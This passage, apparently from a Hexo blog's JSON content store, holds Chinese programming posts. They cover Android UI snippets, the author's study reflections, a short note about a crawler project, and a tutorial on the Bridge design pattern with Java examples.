FriendListAdapter(Friend_List.<span class=\"keyword\">this</span>, friendlist);</span><br><span class=\"line\">                        Friend_List.setAdapter(friendListAdapter);</span><br></pre></td></tr></table></figure></p>\n<p><strong>3.退出确认Dialog</strong><br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">exitActivity</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">new</span> AlertDialog.Builder(<span class=\"keyword\">this</span>).setTitle(<span class=\"string\">\"确认退出吗？\"</span>)</span><br><span class=\"line\">                .setIcon(android.R.drawable.ic_dialog_info)</span><br><span class=\"line\">                .setPositiveButton(<span class=\"string\">\"确定\"</span>, <span class=\"keyword\">new</span> DialogInterface.OnClickListener() &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"meta\">@Override</span></span><br><span class=\"line\">                    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">onClick</span><span class=\"params\">(DialogInterface dialog, <span class=\"keyword\">int</span> which)</span> </span>&#123;</span><br><span class=\"line\">                        <span class=\"comment\">// 点击“确认”后的操作</span></span><br><span class=\"line\">                        JMessageClient.logout();</span><br><span class=\"line\">                        Friend_List.<span class=\"keyword\">this</span>.finish();</span><br><span class=\"line\"></span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;)</span><br><span class=\"line\">                .setNegativeButton(<span class=\"string\">\"返回\"</span>, <span class=\"keyword\">new</span> DialogInterface.OnClickListener() &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"meta\">@Override</span></span><br><span class=\"line\">                    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">onClick</span><span class=\"params\">(DialogInterface dialog, <span class=\"keyword\">int</span> which)</span> </span>&#123;</span><br><span class=\"line\">                        <span class=\"comment\">// 点击“返回”后的操作,这里不设置没有任何操作</span></span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;).show();</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure></p>\n<p><strong>4.不结束软件退出</strong><br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">boolean</span> <span class=\"title\">onKeyDown</span><span class=\"params\">(<span class=\"keyword\">int</span> keyCode, KeyEvent event)</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (keyCode == KeyEvent.KEYCODE_BACK) &#123;</span><br><span class=\"line\">            Intent home = <span class=\"keyword\">new</span> Intent(Intent.ACTION_MAIN);</span><br><span class=\"line\">            home.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);</span><br><span class=\"line\">            home.addCategory(Intent.CATEGORY_HOME);</span><br><span class=\"line\">            startActivity(home);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">super</span>.onKeyDown(keyCode, event);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure></p>\n<p><strong>5.为软件插入启动广告</strong><br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">LaunchActivity</span> <span class=\"keyword\">extends</span> <span class=\"title\">AppCompatActivity</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title\">onCreate</span><span class=\"params\">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>.onCreate(savedInstanceState);</span><br><span class=\"line\">        <span class=\"comment\">//加载启动界面</span></span><br><span class=\"line\">        setContentView(R.layout.activity_launch);</span><br><span class=\"line\">                <span class=\"comment\">//当计时结束时，调至主界面</span></span><br><span class=\"line\">        Handler handler = <span class=\"keyword\">new</span> Handler();</span><br><span class=\"line\">        handler.postDelayed(<span class=\"keyword\">new</span> Runnable() &#123;</span><br><span class=\"line\">            <span class=\"meta\">@Override</span></span><br><span class=\"line\">            <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">                startActivity(<span class=\"keyword\">new</span> Intent(LaunchActivity.<span class=\"keyword\">this</span>, MainActivity.class));</span><br><span class=\"line\">                LaunchActivity.<span class=\"keyword\">this</span>.finish();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;, <span class=\"number\">3000</span>);   <span class=\"comment\">//界面停留时间</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><strong>更多内容在github上</strong></p>\n<h1 id=\"目前学习进度\"><a href=\"#目前学习进度\" class=\"headerlink\" title=\"目前学习进度\"></a>目前学习进度</h1><p><strong>现在已经将之前的电脑作为了服务器，目前正在熟悉网站开发一整套流程。目标是熟悉使用php大法，css和javascript,数据库这个东西讲道理我不想接触，但是没办法，这一关必须得过。虽然有xml，但是xml并不是合理的选择,所以继续学呗。</strong><br><strong>最近在一些新闻上看到android可能有新的发展方向，可能会逐渐走向闭源。怎么说呢，即使google是这样想的，但是这肯定是一个比较漫长的过程，不管怎么说，google不会放弃中国这个市场的，因此也不会拒绝中国的开发人员，因此，学习Android仍然是可行的，最近从图书馆借了一本书，准备系统性的学习一下Android，结束以前的野路子。</strong></p>\n<h1 id=\"对于国创失败的感悟\"><a href=\"#对于国创失败的感悟\" class=\"headerlink\" title=\"对于国创失败的感悟\"></a>对于国创失败的感悟</h1><p><strong>很不幸，我的第一次国创之路失败了，对此做个总结。</strong><br><strong>首先，在找队友的路上，我就走得很不顺。找不到可靠的队友，最后无奈自己来做队长，基本上所有的事情都由我一手独揽。原本准备让一个队友写计划书，然而到了要交计划书的时候他告诉我他没有电脑，写不出来，所以退出。在最后一两天临时找了一个学弟凑人数，然后自己一个人忙着所有的事情。其次，在方向上出现问题。之前一直找不到方向，然后找了一个高中同学聊了半天，决定了一个方向，然而由于我迫切地想要接入小米的接口，使得我计划的整个项目没有创新点，这也成了国创失败的主要原因。归咎下来，主要还是因为我太一意孤行了，之前迫切想要接入小米接口，队友也不好阻止我，就放任我走向一个死胡同。</strong><br><strong>不知道是什么原因，一直没有找到可以一起学习、一起做项目的同伴，在一个人瞎摸索的路上举步维艰，时不时地出现迷茫的情况，不知道自己想要学什么，不知道自己想要做出个什么项目。总是在一个人的路上走走停停。所以，现在真的想寻求一个可靠的同伴一起学习、一起做项目。</strong></p>\n<h3 id=\"新的信仰\"><a href=\"#新的信仰\" class=\"headerlink\" title=\"新的信仰\"></a>新的信仰</h3><p><strong>国创答辩刚刚结束，学院就来了一个讲座，dota女神前来宣讲。讲道理，女神真的很优秀，特别喜欢她信仰的那句话</strong></p>\n<p><strong>：所有事情到最后都将是好的结局，如果不好，那么就不是结局.<br>：Everything gonna be fine in the end,if it’s not fine,it’s not the end.</strong></p>"},{"title":"再次挖坑","date":"2016-06-20T07:18:23.000Z","_content":"\n### 爬虫\n\n**今天看了寝室大神的博客，看他写了一个爬虫，我不禁想去学一下，虽然之前的服务器坑没填，但爬虫更吸引我，所以在此挖坑。。。。。**\n\n**已经填了一部分坑，具体在项目中使用过，为了写数据库的大作业——旅游预订系统，需要航班等信息，因此直接从网上把数据爬下来。**\n\n## 项目地址\n[https://github.com/fenlan/Mycode/tree/master/reser_system](https://github.com/fenlan/Mycode/tree/master/reser_system)","source":"_posts/爬虫.md","raw":"---\ntitle: 再次挖坑\ntags: 爬虫\ndate: 2016-06-20 15:18:23\ncategories: python\n---\n\n### 爬虫\n\n**今天看了寝室大神的博客，看他写了一个爬虫，我不禁想去学一下，虽然之前的服务器坑没填，但爬虫更吸引我，所以在此挖坑。。。。。**\n\n**已经填了一部分坑，具体在项目中使用过，为了写数据库的大作业——旅游预订系统，需要航班等信息，因此直接从网上把数据爬下来。**\n\n## 项目地址\n[https://github.com/fenlan/Mycode/tree/master/reser_system](https://github.com/fenlan/Mycode/tree/master/reser_system)","slug":"爬虫","published":1,"updated":"2017-11-28T02:53:37.599Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgrjsd0n0040yp0l05wxewfr","content":"<h3 id=\"爬虫\"><a href=\"#爬虫\" class=\"headerlink\" title=\"爬虫\"></a>爬虫</h3><p><strong>今天看了寝室大神的博客，看他写了一个爬虫，我不禁想去学一下，虽然之前的服务器坑没填，但爬虫更吸引我，所以在此挖坑。。。。。</strong></p>\n<p><strong>已经填了一部分坑，具体在项目中使用过，为了写数据库的大作业——旅游预订系统，需要航班等信息，因此直接从网上把数据爬下来。</strong></p>\n<h2 id=\"项目地址\"><a href=\"#项目地址\" class=\"headerlink\" title=\"项目地址\"></a>项目地址</h2><p><a href=\"https://github.com/fenlan/Mycode/tree/master/reser_system\" target=\"_blank\" rel=\"external\">https://github.com/fenlan/Mycode/tree/master/reser_system</a></p>\n","excerpt":"","more":"<h3 id=\"爬虫\"><a href=\"#爬虫\" class=\"headerlink\" title=\"爬虫\"></a>爬虫</h3><p><strong>今天看了寝室大神的博客，看他写了一个爬虫，我不禁想去学一下，虽然之前的服务器坑没填，但爬虫更吸引我，所以在此挖坑。。。。。</strong></p>\n<p><strong>已经填了一部分坑，具体在项目中使用过，为了写数据库的大作业——旅游预订系统，需要航班等信息，因此直接从网上把数据爬下来。</strong></p>\n<h2 id=\"项目地址\"><a href=\"#项目地址\" class=\"headerlink\" title=\"项目地址\"></a>项目地址</h2><p><a href=\"https://github.com/fenlan/Mycode/tree/master/reser_system\">https://github.com/fenlan/Mycode/tree/master/reser_system</a></p>\n"},{"title":"设计模式-桥接","date":"2018-04-16T07:18:23.000Z","_content":"\n## 概念\n**桥接模式(Bridge)**是用于把抽象化和实现化解耦，使得两者可以独立变化。这种类型的设计模式属于结构型模式，它通过提供抽象化和实现化的桥接结构来实现两者的解耦。\n\n**桥接意图** : 将抽象部分与实现部分分离，使它们都可以独立的变化\n**主要解决** : 在有多种可能会变化的情况下，用继承会造成类爆炸问题，扩展起来不灵活\n**何时使用** : 实现系统可能有多个角度分类，每一种角度都可能变化\n**如何解决** : 把这种多角度分类分离出来，让它们独立变化，减少它们之间耦合\n**主要代码** : 抽象类依赖实现类\n**桥接优点** : 1、抽象和实现的分离。 2、优秀的扩展能力。 3、实现细节对客户透明\n**桥接缺点** : 桥接模式的引入会增加系统的理解与设计难度，由于聚合关联关系建立在抽象层，要求开发者针对抽象进行设计与编程\n\n## 例子一\n我们需要画出一个红色的圆、绿色的圆、红色的正方形、绿色的正方形。在这个例子中，有两个变化的方面，一个是形状、一个是颜色。\n\n普通的设计是这样的 : 有一个圆类和一个正方形类实现Shape类，而圆类下面有两个子类，红色圆和绿色圆；正方形类下面有两个子类，红色正方形、绿色正方形。但是这样的设计会出现的问题是，当我需要添加一个其他变化的颜色时，诸如蓝色，那么情况会非常糟糕。我们需要在每个形状的下面重新添加一个蓝色形状的实现。这就是桥接定义的变化。\n\n<!--more-->\n为了解决这个问题，我们需要做的事情是将这两个变化放在抽象层，\n![](/images/bridge.png)\n\n> 补充一下，图片有点问题，其中Shape和Color都是抽象的，桥接的抽象独立变化，就是指的Shape和Color可以独立表化而不影响彼此。\n\n## 例子二\n拿汽车在路上行驶的来说。既有小汽车又有公共汽车，它们都不但能在市区中的公路上行驶，也能在高速公路上行驶。这你会发现，对于交通工具（汽车）有不同的类型，它们所行驶的环境（路）也有不同类型，在软件系统中就要适应两个方面（不同车型，不同道路）的变化，怎样实现才能应对这种变化呢？\n\n### 比较传统的做法\n![](http://ww3.sinaimg.cn/mw690/78f9859egw1eyvh7m88sdj20jc0biq4l.jpg)\n\n代码实现\n``` java\n //基类 路\nclass Road {\n    void run() {\n        System.out.println(\"路\");\n    }\n}\n\n//市区街道\nclass Street extends Road {\n    void run() {\n        System.out.println(\"市区街道\");\n    }\n}\n\n//高速公路\nclass SpeedWay extends Road {\n    void run() {\n        System.out.println(\"高速公路\");\n    }\n}\n//小汽车在市区街道行驶\nclass CarOnStreet extends Street {\n    void run() {\n        System.out.println(\"小汽车在市区街道行驶\");\n    }\n}\n//小汽车在高速公路行驶\nclass CarOnSpeedWay extends SpeedWay {\n    void run() {\n        System.out.println(\"小汽车在高速公路行驶\");\n    }\n}\n//公交车在市区街道行驶\nclass BusOnStreet extends Street {\n    void run() {\n        System.out.println(\"公交车在市区街道行驶\");\n    }\n}\n//公交车在高速公路行驶\nclass BusOnSpeedWay extends SpeedWay {\n    void run() {\n        System.out.println(\"公交车在高速公路行驶\");\n    }\n}\n//测试\npublic static void main(String[] args) {\n\n    //小汽车在高速公路行驶\n    CarOnSpeedWay carOnSpeedWay = new CarOnSpeedWay();\n    carOnSpeedWay.run();\n    //公交车在市区街道行驶\n    BusOnStreet busOnStreet = new BusOnStreet();\n    busOnStreet.run();\n}\n```\n\n但是我们说这样的设计是脆弱的，仔细分析就可以发现，它还是存在很多问题，首先它在遵循开放-封闭原则的同时，违背了类的单一职责原则，即一个类只有一个引起它变化的原因，而这里引起变化的原因却有两个，即路类型的变化和汽车类型的变化；其次是重复代码会很多，不同的汽车在不同的路上行驶也会有一部分的代码是相同的；\n\n再次是类的结构过于复杂，继承关系太多，难于维护，最后最致命的一点是扩展性太差。如果变化沿着汽车的类型和不同的道路两个方向变化，我们会看到这个类的结构会迅速的变庞大。\n\n### 应用桥接模式来实现\n重新设计\n![](http://ww3.sinaimg.cn/mw690/78f9859egw1eyvh7mry2yj20gg0h1jsz.jpg)\n\n代码实现\n``` java\nabstract class AbstractRoad{\n    AbstractCar aCar;\n    void run(){};\n}\nabstract class AbstractCar{\n    void run(){};\n}\n\nclass Street extends AbstractRoad{\n    @Override\n    void run() {\n        // TODO Auto-generated method stub\n        super.run();\n        aCar.run();\n        System.out.println(\"在市区街道行驶\");\n    }\n}\nclass SpeedWay extends AbstractRoad{\n    @Override\n    void run() {\n        // TODO Auto-generated method stub\n        super.run();\n        aCar.run();\n        System.out.println(\"在高速公路行驶\");\n    }\n}\nclass Car extends AbstractCar{\n    @Override\n    void run() {\n        // TODO Auto-generated method stub\n        super.run();\n        System.out.print(\"小汽车\");\n    }\n}\nclass Bus extends AbstractCar{\n    @Override\n    void run() {\n        // TODO Auto-generated method stub\n        super.run();\n        System.out.print(\"公交车\");\n    }\n}\n\npublic static void main(String[] args){\n\n    AbstractRoad speedWay = new SpeedWay();\n    speedWay.aCar = new Car();\n    speedWay.run();\n\n    AbstractRoad street = new Street();\n    street.aCar = new Bus();\n    street.run();\n}\n```\n\n这里将Road 和 Car单独抽象，那么其中Road变化和Car变化，都不会影响相互的代码，也没有出现代码重复。通过对象组合的方式，Bridge 模式把两个角色之间的继承关系改为了耦合的关系，从而使这两者可以从容自若的各自独立的变化，这也是Bridge模式的本意。\n\n这样增加了客户程序与路与汽车的耦合。其实这样的担心是没有必要的，因为这种耦合性是由于对象的创建所带来的，完全可以用创建型模式去解决。在应用时结合创建型设计模式来处理具体的问题。\n\n## 例子三\n你有一个电视机的接口，还有一个遥控器的抽象类。我们都知道，将它们中任何一个定义为一个具体类都不是好办法，因为其它厂家会有不同的实现方法。\n\n### 代码实现\n首先定义电视机的接口：ITV\n``` java\npublic interface ITV {\n    public void on();\n    public void off();\n    public void switchChannel(int channel);\n}\n```\n\n实现三星的 ITV 接口\n``` java\npublic class SamsungTV implements ITV {\n    @Override\n    public void on() {\n        System.out.println(\"Samsung is turned on.\");\n    }\n\n    @Override\n    public void off() {\n        System.out.println(\"Samsung is turned off.\");\n    }\n\n    @Override\n    public void switchChannel(int channel) {\n        System.out.println(\"Samsung: channel - \" + channel);\n    }\n}\n```\n\n再实现索尼的ITV接口\n``` java\npublic class SonyTV implements ITV {\n\n    @Override\n    public void on() {\n        System.out.println(\"Sony is turned on.\");\n    }\n\n    @Override\n    public void off() {\n        System.out.println(\"Sony is turned off.\");\n    }\n\n    @Override\n    public void switchChannel(int channel) {\n        System.out.println(\"Sony: channel - \" + channel);\n    }\n}\n```\n\n遥控器要包含对TV的引用\n``` java\npublic abstract class AbstractRemoteControl {\n\n    private ITV tv;\n\n    public AbstractRemoteControl(ITV tv){\n        this.tv = tv;\n    }\n\n    public void turnOn(){\n        tv.on();\n    }\n\n    public void turnOff(){\n        tv.off();\n    }\n\n    public void setChannel(int channel){\n        tv.switchChannel(channel);\n    }\n}\n```\n\n定义遥控器的具体类\n``` java\npublic class LogitechRemoteControl extends AbstractRemoteControl {\n\n    public LogitechRemoteControl(ITV tv) {\n        super(tv);\n    }\n\n    public void setChannelKeyboard(int channel){\n        setChannel(channel);\n        System.out.println(\"Logitech use keyword to set channel.\");\n    }\n}\n```\n\n``` java\npublic class Main {\n    public static void main(String[] args){\n        ITV tv = new SonyTV();\n        LogitechRemoteControl lrc = new LogitechRemoteControl(tv);\n        lrc.setChannelKeyboard(100);\n    }\n}\n```\n## 参考链接\n- [Java设计模式-桥接模式](https://cnbin.github.io/blog/2015/12/11/javashe-ji-mo-shi-chu-tan-zhi-qiao-jie-mo-shi/)\n- [桥接模式](http://www.runoob.com/design-pattern/bridge-pattern.html)\n- [讲故事，学（Java）设计模式—桥接模式](http://www.importnew.com/6857.html)","source":"_posts/设计模式-桥接.md","raw":"---\ntitle: 设计模式-桥接\ndate: 2018-04-16 15:18:23\ncategories: 设计模式\ntags:\n  - 桥接\n  - 抽象\n---\n\n## 概念\n**桥接模式(Bridge)**是用于把抽象化和实现化解耦，使得两者可以独立变化。这种类型的设计模式属于结构型模式，它通过提供抽象化和实现化的桥接结构来实现两者的解耦。\n\n**桥接意图** : 将抽象部分与实现部分分离，使它们都可以独立的变化\n**主要解决** : 在有多种可能会变化的情况下，用继承会造成类爆炸问题，扩展起来不灵活\n**何时使用** : 实现系统可能有多个角度分类，每一种角度都可能变化\n**如何解决** : 把这种多角度分类分离出来，让它们独立变化，减少它们之间耦合\n**主要代码** : 抽象类依赖实现类\n**桥接优点** : 1、抽象和实现的分离。 2、优秀的扩展能力。 3、实现细节对客户透明\n**桥接缺点** : 桥接模式的引入会增加系统的理解与设计难度，由于聚合关联关系建立在抽象层，要求开发者针对抽象进行设计与编程\n\n## 例子一\n我们需要画出一个红色的圆、绿色的圆、红色的正方形、绿色的正方形。在这个例子中，有两个变化的方面，一个是形状、一个是颜色。\n\n普通的设计是这样的 : 有一个圆类和一个正方形类实现Shape类，而圆类下面有两个子类，红色圆和绿色圆；正方形类下面有两个子类，红色正方形、绿色正方形。但是这样的设计会出现的问题是，当我需要添加一个其他变化的颜色时，诸如蓝色，那么情况会非常糟糕。我们需要在每个形状的下面重新添加一个蓝色形状的实现。这就是桥接定义的变化。\n\n<!--more-->\n为了解决这个问题，我们需要做的事情是将这两个变化放在抽象层，\n![](/images/bridge.png)\n\n> 补充一下，图片有点问题，其中Shape和Color都是抽象的，桥接的抽象独立变化，就是指的Shape和Color可以独立表化而不影响彼此。\n\n## 例子二\n拿汽车在路上行驶的来说。既有小汽车又有公共汽车，它们都不但能在市区中的公路上行驶，也能在高速公路上行驶。这你会发现，对于交通工具（汽车）有不同的类型，它们所行驶的环境（路）也有不同类型，在软件系统中就要适应两个方面（不同车型，不同道路）的变化，怎样实现才能应对这种变化呢？\n\n### 比较传统的做法\n![](http://ww3.sinaimg.cn/mw690/78f9859egw1eyvh7m88sdj20jc0biq4l.jpg)\n\n代码实现\n``` java\n //基类 路\nclass Road {\n    void run() {\n        System.out.println(\"路\");\n    }\n}\n\n//市区街道\nclass Street extends Road {\n    void run() {\n        System.out.println(\"市区街道\");\n    }\n}\n\n//高速公路\nclass SpeedWay extends Road {\n    void run() {\n        System.out.println(\"高速公路\");\n    }\n}\n//小汽车在市区街道行驶\nclass CarOnStreet extends Street {\n    void run() {\n        System.out.println(\"小汽车在市区街道行驶\");\n    }\n}\n//小汽车在高速公路行驶\nclass CarOnSpeedWay extends SpeedWay {\n    void run() {\n        System.out.println(\"小汽车在高速公路行驶\");\n    }\n}\n//公交车在市区街道行驶\nclass BusOnStreet extends Street {\n    void run() {\n        System.out.println(\"公交车在市区街道行驶\");\n    }\n}\n//公交车在高速公路行驶\nclass BusOnSpeedWay extends SpeedWay {\n    void run() {\n        System.out.println(\"公交车在高速公路行驶\");\n    }\n}\n//测试\npublic static void main(String[] args) {\n\n    //小汽车在高速公路行驶\n    CarOnSpeedWay carOnSpeedWay = new CarOnSpeedWay();\n    carOnSpeedWay.run();\n    //公交车在市区街道行驶\n    BusOnStreet busOnStreet = new BusOnStreet();\n    busOnStreet.run();\n}\n```\n\n但是我们说这样的设计是脆弱的，仔细分析就可以发现，它还是存在很多问题，首先它在遵循开放-封闭原则的同时，违背了类的单一职责原则，即一个类只有一个引起它变化的原因，而这里引起变化的原因却有两个，即路类型的变化和汽车类型的变化；其次是重复代码会很多，不同的汽车在不同的路上行驶也会有一部分的代码是相同的；\n\n再次是类的结构过于复杂，继承关系太多，难于维护，最后最致命的一点是扩展性太差。如果变化沿着汽车的类型和不同的道路两个方向变化，我们会看到这个类的结构会迅速的变庞大。\n\n### 应用桥接模式来实现\n重新设计\n![](http://ww3.sinaimg.cn/mw690/78f9859egw1eyvh7mry2yj20gg0h1jsz.jpg)\n\n代码实现\n``` java\nabstract class AbstractRoad{\n    AbstractCar aCar;\n    void run(){};\n}\nabstract class AbstractCar{\n    void run(){};\n}\n\nclass Street extends AbstractRoad{\n    @Override\n    void run() {\n        // TODO Auto-generated method stub\n        super.run();\n        aCar.run();\n        System.out.println(\"在市区街道行驶\");\n    }\n}\nclass SpeedWay extends AbstractRoad{\n    @Override\n    void run() {\n        // TODO Auto-generated method stub\n        super.run();\n        aCar.run();\n        System.out.println(\"在高速公路行驶\");\n    }\n}\nclass Car extends AbstractCar{\n    @Override\n    void run() {\n        // TODO Auto-generated method stub\n        super.run();\n        System.out.print(\"小汽车\");\n    }\n}\nclass Bus extends AbstractCar{\n    @Override\n    void run() {\n        // TODO Auto-generated method stub\n        super.run();\n        System.out.print(\"公交车\");\n    }\n}\n\npublic static void main(String[] args){\n\n    AbstractRoad speedWay = new SpeedWay();\n    speedWay.aCar = new Car();\n    speedWay.run();\n\n    AbstractRoad street = new Street();\n    street.aCar = new Bus();\n    street.run();\n}\n```\n\n这里将Road 和 Car单独抽象，那么其中Road变化和Car变化，都不会影响相互的代码，也没有出现代码重复。通过对象组合的方式，Bridge 模式把两个角色之间的继承关系改为了耦合的关系，从而使这两者可以从容自若的各自独立的变化，这也是Bridge模式的本意。\n\n这样增加了客户程序与路与汽车的耦合。其实这样的担心是没有必要的，因为这种耦合性是由于对象的创建所带来的，完全可以用创建型模式去解决。在应用时结合创建型设计模式来处理具体的问题。\n\n## 例子三\n你有一个电视机的接口，还有一个遥控器的抽象类。我们都知道，将它们中任何一个定义为一个具体类都不是好办法，因为其它厂家会有不同的实现方法。\n\n### 代码实现\n首先定义电视机的接口：ITV\n``` java\npublic interface ITV {\n    public void on();\n    public void off();\n    public void switchChannel(int channel);\n}\n```\n\n实现三星的 ITV 接口\n``` java\npublic class SamsungTV implements ITV {\n    @Override\n    public void on() {\n        System.out.println(\"Samsung is turned on.\");\n    }\n\n    @Override\n    public void off() {\n        System.out.println(\"Samsung is turned off.\");\n    }\n\n    @Override\n    public void switchChannel(int channel) {\n        System.out.println(\"Samsung: channel - \" + channel);\n    }\n}\n```\n\n再实现索尼的ITV接口\n``` java\npublic class SonyTV implements ITV {\n\n    @Override\n    public void on() {\n        System.out.println(\"Sony is turned on.\");\n    }\n\n    @Override\n    public void off() {\n        System.out.println(\"Sony is turned off.\");\n    }\n\n    @Override\n    public void switchChannel(int channel) {\n        System.out.println(\"Sony: channel - \" + channel);\n    }\n}\n```\n\n遥控器要包含对TV的引用\n``` java\npublic abstract class AbstractRemoteControl {\n\n    private ITV tv;\n\n    public AbstractRemoteControl(ITV tv){\n        this.tv = tv;\n    }\n\n    public void turnOn(){\n        tv.on();\n    }\n\n    public void turnOff(){\n        tv.off();\n    }\n\n    public void setChannel(int channel){\n        tv.switchChannel(channel);\n    }\n}\n```\n\n定义遥控器的具体类\n``` java\npublic class LogitechRemoteControl extends AbstractRemoteControl {\n\n    public LogitechRemoteControl(ITV tv) {\n        super(tv);\n    }\n\n    public void setChannelKeyboard(int channel){\n        setChannel(channel);\n        System.out.println(\"Logitech use keyword to set channel.\");\n    }\n}\n```\n\n``` java\npublic class Main {\n    public static void main(String[] args){\n        ITV tv = new SonyTV();\n        LogitechRemoteControl lrc = new LogitechRemoteControl(tv);\n        lrc.setChannelKeyboard(100);\n    }\n}\n```\n## 参考链接\n- [Java设计模式-桥接模式](https://cnbin.github.io/blog/2015/12/11/javashe-ji-mo-shi-chu-tan-zhi-qiao-jie-mo-shi/)\n- [桥接模式](http://www.runoob.com/design-pattern/bridge-pattern.html)\n- [讲故事，学（Java）设计模式—桥接模式](http://www.importnew.com/6857.html)","slug":"设计模式-桥接","published":1,"updated":"2018-04-16T07:08:02.188Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgrjsd0r0042yp0ld85a2zg2","content":"<h2 id=\"概念\"><a href=\"#概念\" class=\"headerlink\" title=\"概念\"></a>概念</h2><p><strong>桥接模式(Bridge)</strong>是用于把抽象化和实现化解耦，使得两者可以独立变化。这种类型的设计模式属于结构型模式，它通过提供抽象化和实现化的桥接结构来实现两者的解耦。</p>\n<p><strong>桥接意图</strong> : 将抽象部分与实现部分分离，使它们都可以独立的变化<br><strong>主要解决</strong> : 在有多种可能会变化的情况下，用继承会造成类爆炸问题，扩展起来不灵活<br><strong>何时使用</strong> : 实现系统可能有多个角度分类，每一种角度都可能变化<br><strong>如何解决</strong> : 把这种多角度分类分离出来，让它们独立变化，减少它们之间耦合<br><strong>主要代码</strong> : 抽象类依赖实现类<br><strong>桥接优点</strong> : 1、抽象和实现的分离。 2、优秀的扩展能力。 3、实现细节对客户透明<br><strong>桥接缺点</strong> : 桥接模式的引入会增加系统的理解与设计难度，由于聚合关联关系建立在抽象层，要求开发者针对抽象进行设计与编程</p>\n<h2 id=\"例子一\"><a href=\"#例子一\" class=\"headerlink\" title=\"例子一\"></a>例子一</h2><p>我们需要画出一个红色的圆、绿色的圆、红色的正方形、绿色的正方形。在这个例子中，有两个变化的方面，一个是形状、一个是颜色。</p>\n<p>普通的设计是这样的 : 有一个圆类和一个正方形类实现Shape类，而圆类下面有两个子类，红色圆和绿色圆；正方形类下面有两个子类，红色正方形、绿色正方形。但是这样的设计会出现的问题是，当我需要添加一个其他变化的颜色时，诸如蓝色，那么情况会非常糟糕。我们需要在每个形状的下面重新添加一个蓝色形状的实现。这就是桥接定义的变化。</p>\n<a id=\"more\"></a>\n<p>为了解决这个问题，我们需要做的事情是将这两个变化放在抽象层，<br><img src=\"/images/bridge.png\" alt=\"\"></p>\n<blockquote>\n<p>补充一下，图片有点问题，其中Shape和Color都是抽象的，桥接的抽象独立变化，就是指的Shape和Color可以独立表化而不影响彼此。</p>\n</blockquote>\n<h2 id=\"例子二\"><a href=\"#例子二\" class=\"headerlink\" title=\"例子二\"></a>例子二</h2><p>拿汽车在路上行驶的来说。既有小汽车又有公共汽车，它们都不但能在市区中的公路上行驶，也能在高速公路上行驶。这你会发现，对于交通工具（汽车）有不同的类型，它们所行驶的环境（路）也有不同类型，在软件系统中就要适应两个方面（不同车型，不同道路）的变化，怎样实现才能应对这种变化呢？</p>\n<h3 id=\"比较传统的做法\"><a href=\"#比较传统的做法\" class=\"headerlink\" title=\"比较传统的做法\"></a>比较传统的做法</h3><p><img src=\"http://ww3.sinaimg.cn/mw690/78f9859egw1eyvh7m88sdj20jc0biq4l.jpg\" alt=\"\"></p>\n<p>代码实现<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span 